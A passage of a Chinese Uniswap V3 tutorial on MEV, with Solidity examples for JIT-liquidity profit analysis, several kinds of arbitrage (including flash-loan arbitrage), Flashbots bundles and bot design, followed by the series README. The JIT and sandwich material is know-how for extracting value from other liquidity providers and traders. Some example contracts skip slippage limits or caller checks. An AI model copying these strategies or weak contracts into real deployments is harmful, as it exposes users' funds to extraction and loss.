原有LP手续费被稀释\n\n3.2 JIT攻击的数学分析\nflowchart TB\n    subgraph RevenueGroup[&quot;攻击者收益&quot;]\n        R1[手续费收入]\n        R2[无常损失]\n        R3[Gas成本]\n        NET[净收益 = R1 - R2 - R3]\n    end\n\n    subgraph FactorGroup[&quot;关键因素&quot;]\n        F1[交易金额]\n        F2[区间宽度]\n        F3[流动性数量]\n        F4[现有流动性]\n    end\n\n    F1 --&gt; R1\n    F2 --&gt; R1\n    F3 --&gt; R1\n    F4 --&gt; R1\n    F2 --&gt; R2\n    F3 --&gt; R2\n    R1 --&gt; NET\n    R2 --&gt; NET\n    R3 --&gt; NET\n\n    style NET fill:#fff3e0\n\n收益计算：\n// JIT攻击收益分析\nstruct JITAnalysis {\n    uint256 tradeAmount;      // 目标交易金额\n    uint128 jitLiquidity;     // JIT流动性数量\n    uint128 existingLiquidity; // 现有流动性\n    int24 tickLower;          // JIT区间下界\n    int24 tickUpper;          // JIT区间上界\n    uint24 fee;               // 费率\n}\n \nfunction analyzeJITProfit(JITAnalysis memory params)\n    internal pure returns (int256 profit)\n{\n    // 1. 计算手续费收入\n    uint256 totalFee = params.tradeAmount * params.fee / 1e6;\n \n    // 2. 计算JIT流动性占比\n    uint256 jitShare = params.jitLiquidity * 1e18 /\n        (params.jitLiquidity + params.existingLiquidity);\n \n    // 3. JIT获得的手续费\n    uint256 jitFeeIncome = totalFee * jitShare / 1e18;\n \n    // 4. 计算无常损失\n    // 由于区间极窄且持有时间极短，无常损失很小\n    uint256 impermanentLoss = calculateIL(\n        params.tickLower,\n        params.tickUpper,\n        params.tradeAmount\n    );\n \n    // 5. Gas成本（mint + burn）\n    uint256 gasCost = estimateGasCost();\n \n    profit = int256(jitFeeIncome) - int256(impermanentLoss) - int256(gasCost);\n}\n3.3 JIT攻击的条件\nflowchart TD\n    subgraph FavorableGroup[&quot;有利条件&quot;]\n        A1[交易金额大]\n        A2[现有流动性低]\n        A3[费率高]\n        A4[Gas价格低]\n    end\n\n    subgraph UnfavorableGroup[&quot;不利条件&quot;]\n        B1[交易金额小]\n        B2[现有流动性高]\n        B3[费率低]\n        B4[Gas价格高]\n    end\n\n    subgraph DecisionGroup[&quot;决策&quot;]\n        D{是否执行JIT?}\n    end\n\n    A1 --&gt;|有利| D\n    A2 --&gt;|有利| D\n    A3 --&gt;|有利| D\n    A4 --&gt;|有利| D\n    B1 --&gt;|不利| D\n    B2 --&gt;|不利| D\n    B3 --&gt;|不利| D\n    B4 --&gt;|不利| D\n\n    D --&gt;|是| EXECUTE[执行攻击]\n    D --&gt;|否| SKIP[放弃]\n\n    style EXECUTE fill:#c8e6c9\n    style SKIP fill:#ffcdd2\n\n3.4 JIT对LP的影响\nflowchart LR\n    subgraph 无JIT\n        N1[交易手续费: 100]\n        N2[LP A获得: 50]\n        N3[LP B获得: 50]\n    end\n\n    subgraph 有JIT\n        J1[交易手续费: 100]\n        J2[JIT获得: 70]\n        J3[LP A获得: 15]\n        J4[LP B获得: 15]\n    end\n\n    无JIT --&gt;|JIT介入| 有JIT\n\n    style J2 fill:#ffcdd2\n    style J3 fill:#ffcdd2\n    style J4 fill:#ffcdd2\n\n3.5 防御和缓解\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n策略说明效果时间锁要求流动性锁定最短时间增加攻击成本动态费率根据持有时间调整费率降低短期LP收益批量执行聚合交易后统一执行减少可见性私有池限制谁可以提供流动性完全防止\n\n4. 跨池套利\n4.1 套利机会来源\nflowchart TB\n    subgraph SourceGroup[&quot;价格差异来源&quot;]\n        S1[不同DEX价格差]\n        S2[同DEX不同费率池]\n        S3[跨链价格差]\n        S4[CEX与DEX价差]\n    end\n\n    subgraph TypeGroup[&quot;套利类型&quot;]\n        T1[两点套利]\n        T2[三角套利]\n        T3[闪电贷套利]\n    end\n\n    S1 --&gt; TypeGroup\n    S2 --&gt; TypeGroup\n    S3 --&gt; TypeGroup\n    S4 --&gt; TypeGroup\n\n    style TypeGroup fill:#e3f2fd\n\n4.2 两点套利\n最简单的套利形式：在价格低的地方买入，在价格高的地方卖出。\nsequenceDiagram\n    participant Arb as 套利者\n    participant PoolA as V3池子A(低价)\n    participant PoolB as V3池子B(高价)\n\n    Note over Arb: 发现价差机会\n\n    Arb-&gt;&gt;PoolA: swap: ETH → USDC\n    PoolA--&gt;&gt;Arb: 获得USDC\n\n    Arb-&gt;&gt;PoolB: swap: USDC → ETH\n    PoolB--&gt;&gt;Arb: 获得更多ETH\n\n    Note over Arb: 利润 = ETH增量 - Gas\n\n代码实现：\n// 两点套利合约\ncontract TwoPoolArbitrage {\n    ISwapRouter public immutable router;\n \n    struct ArbParams {\n        address tokenA;\n        address tokenB;\n        uint24 feePoolLow;    // 低价池费率\n        uint24 feePoolHigh;   // 高价池费率\n        uint256 amountIn;\n        uint256 minProfit;\n    }\n \n    function executeArbitrage(ArbParams calldata params)\n        external\n        returns (uint256 profit)\n    {\n        // 1. 在低价池买入tokenB\n        uint256 amountB = router.exactInputSingle(\n            ISwapRouter.ExactInputSingleParams({\n                tokenIn: params.tokenA,\n                tokenOut: params.tokenB,\n                fee: params.feePoolLow,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: params.amountIn,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            })\n        );\n \n        // 2. 在高价池卖出tokenB\n        uint256 amountAOut = router.exactInputSingle(\n            ISwapRouter.ExactInputSingleParams({\n                tokenIn: params.tokenB,\n                tokenOut: params.tokenA,\n                fee: params.feePoolHigh,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: amountB,\n                amountOutMinimum: params.amountIn + params.minProfit,\n                sqrtPriceLimitX96: 0\n            })\n        );\n \n        profit = amountAOut - params.amountIn;\n        require(profit &gt;= params.minProfit, &quot;Insufficient profit&quot;);\n    }\n}\n4.3 三角套利\n利用三个或更多代币对之间的价格不一致：\nflowchart LR\n    subgraph 三角套利路径\n        ETH[ETH]\n        USDC[USDC]\n        DAI[DAI]\n    end\n\n    ETH --&gt;|1. 卖出| USDC\n    USDC --&gt;|2. 兑换| DAI\n    DAI --&gt;|3. 买入| ETH\n\n    NOTE[条件: ETH_out &gt; ETH_in]\n\n    style NOTE fill:#c8e6c9\n\n// 三角套利实现\ncontract TriangularArbitrage {\n    ISwapRouter public immutable router;\n \n    struct TriArbParams {\n        address tokenA;     // 起始代币\n        address tokenB;     // 中间代币\n        address tokenC;     // 第三代币\n        uint24 feeAB;\n        uint24 feeBC;\n        uint24 feeCA;\n        uint256 amountIn;\n        uint256 minProfit;\n    }\n \n    function executeTriArb(TriArbParams calldata params)\n        external\n        returns (uint256 profit)\n    {\n        // A → B\n        uint256 amountB = swap(\n            params.tokenA,\n            params.tokenB,\n            params.feeAB,\n            params.amountIn\n        );\n \n        // B → C\n        uint256 amountC = swap(\n            params.tokenB,\n            params.tokenC,\n            params.feeBC,\n            amountB\n        );\n \n        // C → A\n        uint256 amountAOut = swap(\n            params.tokenC,\n            params.tokenA,\n            params.feeCA,\n            amountC\n        );\n \n        profit = amountAOut - params.amountIn;\n        require(profit &gt;= params.minProfit, &quot;Insufficient profit&quot;);\n    }\n \n    function swap(\n        address tokenIn,\n        address tokenOut,\n        uint24 fee,\n        uint256 amountIn\n    ) internal returns (uint256 amountOut) {\n        amountOut = router.exactInputSingle(\n            ISwapRouter.ExactInputSingleParams({\n                tokenIn: tokenIn,\n                tokenOut: tokenOut,\n                fee: fee,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: amountIn,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            })\n        );\n    }\n}\n4.4 闪电贷套利\n利用闪电贷实现零资金套利：\nsequenceDiagram\n    participant Arb as 套利合约\n    participant Lender as 闪电贷协议\n    participant PoolA as 低价DEX\n    participant PoolB as 高价DEX\n\n    Arb-&gt;&gt;Lender: 1. 借入大量资金\n    Lender--&gt;&gt;Arb: 转入资金\n\n    Arb-&gt;&gt;PoolA: 2. 买入（低价）\n    PoolA--&gt;&gt;Arb: 获得代币\n\n    Arb-&gt;&gt;PoolB: 3. 卖出（高价）\n    PoolB--&gt;&gt;Arb: 获得更多原始代币\n\n    Arb-&gt;&gt;Lender: 4. 归还本金+利息\n    Note over Arb: 5. 保留利润\n\n// 闪电贷套利（使用Aave V3）\ncontract FlashLoanArbitrage is IFlashLoanSimpleReceiver {\n    IPoolAddressesProvider public immutable ADDRESSES_PROVIDER;\n    IPool public immutable POOL;\n    ISwapRouter public immutable swapRouter;\n \n    struct ArbData {\n        address tokenBuy;\n        uint24 feeLow;\n        uint24 feeHigh;\n    }\n \n    function executeFlashLoanArb(\n        address asset,\n        uint256 amount,\n        ArbData calldata arbData\n    ) external {\n        bytes memory params = abi.encode(arbData);\n \n        POOL.flashLoanSimple(\n            address(this),\n            asset,\n            amount,\n            params,\n            0 // referralCode\n        );\n    }\n \n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external override returns (bool) {\n        require(msg.sender == address(POOL), &quot;Invalid caller&quot;);\n \n        ArbData memory arbData = abi.decode(params, (ArbData));\n \n        // 执行套利\n        // 1. 在低费率池买入\n        uint256 bought = swapRouter.exactInputSingle(\n            ISwapRouter.ExactInputSingleParams({\n                tokenIn: asset,\n                tokenOut: arbData.tokenBuy,\n                fee: arbData.feeLow,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: amount,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            })\n        );\n \n        // 2. 在高费率池卖出\n        uint256 received = swapRouter.exactInputSingle(\n            ISwapRouter.ExactInputSingleParams({\n                tokenIn: arbData.tokenBuy,\n                tokenOut: asset,\n                fee: arbData.feeHigh,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: bought,\n                amountOutMinimum: amount + premium,\n                sqrtPriceLimitX96: 0\n            })\n        );\n \n        // 3. 偿还闪电贷\n        uint256 amountOwed = amount + premium;\n        IERC20(asset).approve(address(POOL), amountOwed);\n \n        // 利润留在合约中\n        return true;\n    }\n}\n\n5. Tick边界套利\n5.1 原理说明\nV3的Tick边界是套利的重要机会点：\nflowchart TB\n    subgraph TickGroup[&quot;Tick边界特点&quot;]\n        T1[流动性突变点]\n        T2[价格离散化]\n        T3[滑点不连续]\n    end\n\n    subgraph OppGroup[&quot;套利机会&quot;]\n        O1[跨tick价差]\n        O2[流动性缺口]\n        O3[临界点套利]\n    end\n\n    T1 --&gt; OppGroup\n    T2 --&gt; OppGroup\n    T3 --&gt; OppGroup\n\n    style OppGroup fill:#fff3e0\n\n5.2 流动性缺口套利\nflowchart LR\n    subgraph 价格区间\n        A[Tick 100&lt;br/&gt;L=1000]\n        B[Tick 101&lt;br/&gt;L=100]\n        C[Tick 102&lt;br/&gt;L=1000]\n    end\n\n    A --&gt;|流动性下降| B\n    B --&gt;|流动性恢复| C\n\n    NOTE[Tick 101流动性缺口&lt;br/&gt;可能存在套利机会]\n\n    style B fill:#ffcdd2\n\n// 检测流动性缺口\nfunction findLiquidityGaps(\n    IUniswapV3Pool pool,\n    int24 tickLower,\n    int24 tickUpper\n) external view returns (int24[] memory gapTicks) {\n    int24 tickSpacing = pool.tickSpacing();\n    uint128 avgLiquidity;\n    uint256 count;\n \n    // 计算平均流动性\n    for (int24 tick = tickLower; tick &lt;= tickUpper; tick += tickSpacing) {\n        (uint128 liquidityGross,,,,,,,) = pool.ticks(tick);\n        avgLiquidity += liquidityGross;\n        count++;\n    }\n    avgLiquidity = avgLiquidity / uint128(count);\n \n    // 找出流动性显著低于平均值的tick\n    uint256 gapCount;\n    int24[] memory tempGaps = new int24[](count);\n \n    for (int24 tick = tickLower; tick &lt;= tickUpper; tick += tickSpacing) {\n        (uint128 liquidityGross,,,,,,,) = pool.ticks(tick);\n        // 流动性低于平均值的20%视为缺口\n        if (liquidityGross &lt; avgLiquidity / 5) {\n            tempGaps[gapCount++] = tick;\n        }\n    }\n \n    // 返回结果\n    gapTicks = new int24[](gapCount);\n    for (uint256 i = 0; i &lt; gapCount; i++) {\n        gapTicks[i] = tempGaps[i];\n    }\n}\n5.3 Tick跨越时机\nsequenceDiagram\n    participant Monitor as 监控器\n    participant Pool as V3池子\n    participant Arb as 套利者\n\n    Monitor-&gt;&gt;Pool: 监控价格接近tick边界\n    Pool--&gt;&gt;Monitor: 当前tick: 99, 价格接近100\n\n    Note over Monitor: 预测即将跨越tick 100\n\n    Monitor-&gt;&gt;Arb: 发送信号\n    Arb-&gt;&gt;Pool: 执行套利交易\n    Note over Arb: 利用tick跨越时的&lt;br/&gt;流动性变化获利\n\n\n6. Flashbots与私有交易\n6.1 Flashbots架构\nflowchart TB\n    subgraph 传统交易流程\n        T1[用户] --&gt;|广播| T2[公开内存池]\n        T2 --&gt;|可见| T3[所有节点]\n        T3 --&gt;|竞争| T4[被抢跑]\n    end\n\n    subgraph Flashbots流程\n        F1[用户] --&gt;|私有提交| F2[Flashbots Relay]\n        F2 --&gt;|密封| F3[区块构建者]\n        F3 --&gt;|打包| F4[安全执行]\n    end\n\n    style Flashbots流程 fill:#c8e6c9\n    style 传统交易流程 fill:#ffcdd2\n\n6.2 Bundle提交\n// Flashbots Bundle结构\ninterface IFlashbotsRelay {\n    struct Bundle {\n        bytes[] signedTransactions;  // 签名的交易列表\n        uint256 blockNumber;          // 目标区块\n        uint256 minTimestamp;         // 最早执行时间\n        uint256 maxTimestamp;         // 最晚执行时间\n    }\n}\n \n// 使用ethers.js提交Bundle\n/*\nconst flashbotsProvider = await FlashbotsBundleProvider.create(\n    provider,\n    authSigner,\n    &#039;relay.flashbots.net&#039;\n);\n \nconst signedBundle = await flashbotsProvider.signBundle([\n    {\n        signer: wallet,\n        transaction: {\n            to: targetContract,\n            data: arbCalldata,\n            gasLimit: 500000,\n            maxFeePerGas: gwei(50),\n            maxPriorityFeePerGas: gwei(3),\n        }\n    }\n]);\n \nconst bundleSubmission = await flashbotsProvider.sendBundle(\n    signedBundle,\n    targetBlockNumber\n);\n*/\n6.3 MEV-Share\nMEV-Share允许用户从MEV中获取一部分收益：\nflowchart LR\n    subgraph 传统MEV\n        A1[用户交易]\n        A2[搜索者提取MEV]\n        A3[用户获得: 0]\n    end\n\n    subgraph MEV-Share\n        B1[用户交易]\n        B2[搜索者提取MEV]\n        B3[收益分成]\n        B4[用户获得: MEV的X%]\n    end\n\n    传统MEV --&gt;|改进| MEV-Share\n\n    style B4 fill:#c8e6c9\n\n6.4 私有交易池对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方案提供方特点Flashbots ProtectFlashbots免费、广泛支持MEV BlockerCoW Protocol退款机制SecureRPCManifold多链支持Eden NetworkEden优先排序\n\n7. 套利机器人开发\n7.1 架构设计\nflowchart TB\n    subgraph DataLayer[&quot;数据层&quot;]\n        D1[区块链节点]\n        D2[内存池监控]\n        D3[价格Feed]\n    end\n\n    subgraph AnalysisLayer[&quot;分析层&quot;]\n        A1[机会识别]\n        A2[利润计算]\n        A3[风险评估]\n    end\n\n    subgraph ExecLayer[&quot;执行层&quot;]\n        E1[交易构建]\n        E2[Gas优化]\n        E3[执行策略]\n    end\n\n    subgraph InfraLayer[&quot;基础设施&quot;]\n        I1[低延迟节点]\n        I2[私有交易池]\n        I3[监控告警]\n    end\n\n    DataLayer --&gt; AnalysisLayer\n    AnalysisLayer --&gt; ExecLayer\n    InfraLayer --&gt; DataLayer\n    InfraLayer --&gt; AnalysisLayer\n    InfraLayer --&gt; ExecLayer\n\n7.2 机会监控\n// 套利机会监控\ncontract ArbitrageMonitor {\n    struct PoolInfo {\n        address pool;\n        address token0;\n        address token1;\n        uint24 fee;\n    }\n \n    struct Opportunity {\n        address poolLow;\n        address poolHigh;\n        uint256 priceDiff;\n        uint256 estimatedProfit;\n    }\n \n    // 获取多个池子的价格\n    function getPrices(PoolInfo[] calldata pools)\n        external view\n        returns (uint160[] memory sqrtPrices)\n    {\n        sqrtPrices = new uint160[](pools.length);\n        for (uint256 i = 0; i &lt; pools.length; i++) {\n            (sqrtPrices[i],,,,,,) = IUniswapV3Pool(pools[i].pool).slot0();\n        }\n    }\n \n    // 检测套利机会\n    function findOpportunities(\n        PoolInfo[] calldata pools,\n        uint256 minProfitBps  // 最小利润（基点）\n    ) external view returns (Opportunity[] memory) {\n        uint160[] memory prices = this.getPrices(pools);\n \n        // 比较相同代币对的不同池子\n        // 返回利润超过阈值的机会\n        // ...\n    }\n}\n7.3 利润计算\n// 精确利润计算\nlibrary ProfitCalculator {\n    using FullMath for uint256;\n \n    struct SwapEstimate {\n        uint256 amountIn;\n        uint256 amountOut;\n        uint256 priceImpact;\n        uint256 fee;\n    }\n \n    // 估算swap输出\n    function estimateSwapOutput(\n        address pool,\n        bool zeroForOne,\n        uint256 amountIn\n    ) internal view returns (SwapEstimate memory estimate) {\n        IUniswapV3Pool poolContract = IUniswapV3Pool(pool);\n \n        (uint160 sqrtPriceX96, int24 tick,,,,,) = poolContract.slot0();\n        uint128 liquidity = poolContract.liquidity();\n        uint24 fee = poolContract.fee();\n \n        // 使用Quoter或本地计算\n        estimate.amountIn = amountIn;\n        estimate.fee = amountIn * fee / 1e6;\n \n        // 简化计算（实际应考虑跨tick）\n        uint256 amountInLessFee = amountIn - estimate.fee;\n \n        if (zeroForOne) {\n            // token0 → token1\n            estimate.amountOut = calculateAmount1Delta(\n                sqrtPriceX96,\n                amountInLessFee,\n                liquidity\n            );\n        } else {\n            // token1 → token0\n            estimate.amountOut = calculateAmount0Delta(\n                sqrtPriceX96,\n                amountInLessFee,\n                liquidity\n            );\n        }\n \n        // 计算价格影响\n        estimate.priceImpact = calculatePriceImpact(\n            amountIn,\n            estimate.amountOut,\n            sqrtPriceX96\n        );\n    }\n \n    // 计算净利润\n    function calculateNetProfit(\n        SwapEstimate memory buy,\n        SwapEstimate memory sell,\n        uint256 gasCost\n    ) internal pure returns (int256 profit) {\n        profit = int256(sell.amountOut) - int256(buy.amountIn) - int256(gasCost);\n    }\n}\n7.4 Gas优化策略\nflowchart TB\n    subgraph Gas优化技术\n        G1[合约优化]\n        G2[调用优化]\n        G3[存储优化]\n    end\n\n    subgraph 合约优化\n        C1[内联汇编]\n        C2[减少SLOAD]\n        C3[批量操作]\n    end\n\n    subgraph 调用优化\n        D1[multicall]\n        D2[直接调用Pool]\n        D3[跳过Router]\n    end\n\n    subgraph 存储优化\n        S1[最小化存储]\n        S2[使用transient]\n        S3[内存计算]\n    end\n\n    Gas优化技术 --&gt; 合约优化 &amp; 调用优化 &amp; 存储优化\n\n// Gas优化的套利合约\ncontract OptimizedArbitrage {\n    // 使用immutable减少SLOAD\n    address private immutable WETH;\n    address private immutable ROUTER;\n \n    // 直接调用Pool而非通过Router\n    function directPoolSwap(\n        address pool,\n        bool zeroForOne,\n        int256 amountSpecified\n    ) internal returns (int256 amount0, int256 amount1) {\n        (amount0, amount1) = IUniswapV3Pool(pool).swap(\n            address(this),\n            zeroForOne,\n            amountSpecified,\n            zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1,\n            bytes(&quot;&quot;)\n        );\n    }\n \n    // 批量执行多个swap\n    function batchSwap(\n        address[] calldata pools,\n        bool[] calldata directions,\n        int256[] calldata amounts\n    ) external {\n        uint256 length = pools.length;\n        for (uint256 i; i &lt; length;) {\n            directPoolSwap(pools[i], directions[i], amounts[i]);\n            unchecked { ++i; }\n        }\n    }\n \n    // swap回调\n    function uniswapV3SwapCallback(\n        int256 amount0Delta,\n        int256 amount1Delta,\n        bytes calldata\n    ) external {\n        // 最小化回调逻辑\n        if (amount0Delta &gt; 0) {\n            IERC20(IUniswapV3Pool(msg.sender).token0())\n                .transfer(msg.sender, uint256(amount0Delta));\n        }\n        if (amount1Delta &gt; 0) {\n            IERC20(IUniswapV3Pool(msg.sender).token1())\n                .transfer(msg.sender, uint256(amount1Delta));\n        }\n    }\n}\n\n8. 风险管理\n8.1 常见风险\nflowchart TB\n    subgraph TechGroup[&quot;技术风险&quot;]\n        T1[合约漏洞]\n        T2[重入攻击]\n        T3[预言机操纵]\n    end\n\n    subgraph MarketGroup[&quot;市场风险&quot;]\n        M1[价格剧烈波动]\n        M2[流动性枯竭]\n        M3[竞争失败]\n    end\n\n    subgraph ExecGroup[&quot;执行风险&quot;]\n        E1[交易失败]\n        E2[Gas估算错误]\n        E3[滑点超限]\n    end\n\n    subgraph OpsGroup[&quot;运营风险&quot;]\n        O1[私钥泄露]\n        O2[节点故障]\n        O3[网络拥堵]\n    end\n\n    subgraph Result[&quot;损失&quot;]\n        LOSS[潜在损失]\n    end\n\n    TechGroup --&gt; Result\n    MarketGroup --&gt; Result\n    ExecGroup --&gt; Result\n    OpsGroup --&gt; Result\n\n    style Result fill:#ffcdd2\n\n8.2 风险控制措施\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n风险类型控制措施合约漏洞审计、测试、限额重入攻击nonReentrant、CEI模式价格波动滑点保护、止损竞争失败快速节点、Flashbots交易失败模拟执行、回滚保护私钥安全硬件钱包、多签\n8.3 安全检查清单\n// 安全套利合约示例\ncontract SecureArbitrage is ReentrancyGuard, Ownable {\n    using SafeERC20 for IERC20;\n \n    // 最大单笔交易限额\n    uint256 public maxTradeAmount;\n \n    // 最小利润要求\n    uint256 public minProfitBps;\n \n    // 白名单池子\n    mapping(address =&gt; bool) public allowedPools;\n \n    // 紧急暂停\n    bool public paused;\n \n    modifier notPaused() {\n        require(!paused, &quot;Paused&quot;);\n        _;\n    }\n \n    modifier onlyAllowedPool(address pool) {\n        require(allowedPools[pool], &quot;Pool not allowed&quot;);\n        _;\n    }\n \n    modifier withinLimits(uint256 amount) {\n        require(amount &lt;= maxTradeAmount, &quot;Exceeds max&quot;);\n        _;\n    }\n \n    function executeArbitrage(\n        address poolA,\n        address poolB,\n        uint256 amount,\n        uint256 minProfit\n    ) external\n        nonReentrant\n        notPaused\n        onlyAllowedPool(poolA)\n        onlyAllowedPool(poolB)\n        withinLimits(amount)\n    {\n        require(minProfit &gt;= minProfitBps, &quot;Profit too low&quot;);\n \n        // 执行前模拟\n        uint256 expectedProfit = simulateArbitrage(poolA, poolB, amount);\n        require(expectedProfit &gt;= minProfit, &quot;Simulation failed&quot;);\n \n        // 执行套利\n        uint256 actualProfit = _executeArbitrage(poolA, poolB, amount);\n \n        // 验证结果\n        require(actualProfit &gt;= minProfit, &quot;Insufficient profit&quot;);\n \n        emit ArbitrageExecuted(poolA, poolB, amount, actualProfit);\n    }\n \n    // 紧急提取\n    function emergencyWithdraw(address token) external onlyOwner {\n        uint256 balance = IERC20(token).balanceOf(address(this));\n        IERC20(token).safeTransfer(owner(), balance);\n    }\n \n    // 暂停/恢复\n    function setPaused(bool _paused) external onlyOwner {\n        paused = _paused;\n    }\n}\n\n9. 实战案例分析\n9.1 成功套利案例\nflowchart TB\n    subgraph 案例背景\n        B1[ETH/USDC价格差异]\n        B2[Pool A: 2000 USDC/ETH]\n        B3[Pool B: 2010 USDC/ETH]\n        B4[价差: 0.5%]\n    end\n\n    subgraph 执行过程\n        E1[借入100 ETH闪电贷]\n        E2[Pool A买入200,000 USDC]\n        E3[Pool B卖出获得100.35 ETH]\n        E4[归还100 ETH + 利息]\n    end\n\n    subgraph 结果\n        R1[毛利润: 0.35 ETH]\n        R2[闪电贷费用: 0.09 ETH]\n        R3[Gas费用: 0.01 ETH]\n        R4[净利润: 0.25 ETH ≈ $500]\n    end\n\n    案例背景 --&gt; 执行过程 --&gt; 结果\n\n    style R4 fill:#c8e6c9\n\n9.2 失败案例教训\nflowchart TB\n    subgraph 失败原因\n        F1[Gas估算不足]\n        F2[被抢跑]\n        F3[滑点超限]\n        F4[价格快速变化]\n    end\n\n    subgraph 教训\n        L1[始终留有Gas余量]\n        L2[使用Flashbots]\n        L3[设置合理滑点]\n        L4[快速执行or放弃]\n    end\n\n    F1 --&gt; L1\n    F2 --&gt; L2\n    F3 --&gt; L3\n    F4 --&gt; L4\n\n    style 教训 fill:#fff3e0\n\n\n10. 本章小结\n10.1 核心概念回顾\nmindmap\n  root((MEV与套利))\n    MEV基础\n      交易排序\n      价值提取\n      参与者生态\n    攻击类型\n      三明治攻击\n      JIT流动性\n      清算\n    套利策略\n      两点套利\n      三角套利\n      闪电贷套利\n      Tick边界套利\n    防护措施\n      Flashbots\n      私有交易池\n      滑点保护\n    机器人开发\n      架构设计\n      利润计算\n      Gas优化\n      风险管理\n\n10.2 关键要点总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n主题要点MEV本质交易排序权力带来的价值提取三明治攻击抢跑+尾随，利用价格影响获利JIT攻击V3特有，利用集中流动性稀释LP收益套利价格差异修正，提高市场效率防护私有交易、滑点保护、分批执行开发低延迟、Gas优化、风险控制\n10.3 生态展望\nflowchart LR\n    subgraph 当前状态\n        C1[搜索者竞争激烈]\n        C2[MEV集中化]\n        C3[用户体验受损]\n    end\n\n    subgraph 未来发展\n        F1[MEV民主化]\n        F2[协议级防护]\n        F3[公平排序服务]\n        F4[用户收益分成]\n    end\n\n    当前状态 --&gt;|演进| 未来发展\n\n    style 未来发展 fill:#c8e6c9\n\n\n系列总结\n至此，「死磕Uniswap V3」系列七篇文章全部完成。让我们回顾一下整个系列：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n篇章核心收获第一篇理解集中流动性的革命性创新第二篇掌握Tick机制和价格数学基础第三篇了解合约架构和存储优化技巧第四篇深入swap函数的执行细节第五篇掌握流动性管理的完整流程第六篇理解费用分配和预言机机制第七篇认识MEV生态和套利策略\n学习建议：\n\n理论到实践：在测试网部署合约，亲自体验各种操作\n源码阅读：对照文章阅读官方合约代码\n工具使用：学习使用Tenderly、Dune等分析工具\n持续关注：跟踪Uniswap的最新发展（V4等）\n\n\n参考资料\n\nFlashbots Documentation\nMEV Wiki\nUniswap V3 Development Book\nEthereum MEV Research\nMEV-Share Documentation\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/README":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/README","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/README.md","title":"README","links":["blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/01-概述与集中流动性","02-Tick机制与价格数学","03-架构与合约设计","04-交换机制深度解析","05-流动性管理与头寸","06-费用系统与预言机","blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/07-MEV与套利策略"],"tags":[],"content":"死磕Uniswap V3 系列文章\n\n深入剖析Uniswap V3的核心机制与实现原理\n\n系列概述\n本系列共7篇文章，从基础概念到高级主题，全面解析Uniswap V3的设计与实现。\nflowchart LR\n    subgraph 基础篇\n        A1[01-概述与集中流动性]\n        A2[02-Tick机制与价格数学]\n    end\n\n    subgraph 核心篇\n        B1[03-架构与合约设计]\n        B2[04-交换机制深度解析]\n        B3[05-流动性管理与头寸]\n    end\n\n    subgraph 进阶篇\n        C1[06-费用系统与预言机]\n        C2[07-MEV与套利策略]\n    end\n\n    基础篇 --&gt; 核心篇 --&gt; 进阶篇\n\n文章目录\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容难度01概述与集中流动性AMM演进、集中流动性原理⭐⭐02Tick机制与价格数学Tick设计、价格转换算法⭐⭐⭐03架构与合约设计Factory、Pool合约结构⭐⭐⭐04交换机制深度解析swap函数、价格发现⭐⭐⭐⭐05流动性管理与头寸Position、mint/burn⭐⭐⭐⭐06费用系统与预言机费用分配、TWAP⭐⭐⭐⭐07MEV与套利策略JIT、三明治攻击⭐⭐⭐⭐⭐\n学习路径\n入门读者\n如果你是DeFi新手，建议按顺序阅读：\n\n第一篇：了解AMM的基本概念和V3的核心创新\n第二篇：理解Tick机制如何实现集中流动性\n第三篇：认识V3的合约架构\n\n中级读者\n如果你已有DeFi开发经验：\n\n重点阅读第四、五篇，深入理解swap和流动性管理\n结合官方源码进行学习\n\n高级读者\n如果你想深入研究：\n\n深入第六篇的费用机制和预言机设计\n研究第七篇的MEV策略，考虑实际应用\n\n核心概念速查\n数学公式\n价格定义：      price = 1.0001^tick\n集中流动性：    (x + L/√Pb) × (y + L×√Pa) = L²\n代币数量：      Δx = L × (1/√Pa - 1/√Pb)\n                Δy = L × (√Pb - √Pa)\n\n关键数据结构\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n结构用途位置Slot0打包存储池子核心状态Pool合约Position.Info流动性头寸信息Position库Tick.InfoTick级别的流动性和费用数据Tick库Observation预言机历史数据点Oracle库\n核心函数\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数功能合约swap()代币交换UniswapV3Poolmint()添加流动性UniswapV3Poolburn()移除流动性UniswapV3Poolcollect()收取费用UniswapV3Poolobserve()查询预言机UniswapV3Pool\n配套资源\n官方资源\n\nUniswap V3 Core\nUniswap V3 Periphery\nUniswap V3 白皮书\nUniswap V3 官方文档\n\n学习工具\n\nUniswap V3 Development Book\nTenderly - 交易模拟和调试\nDune Analytics - 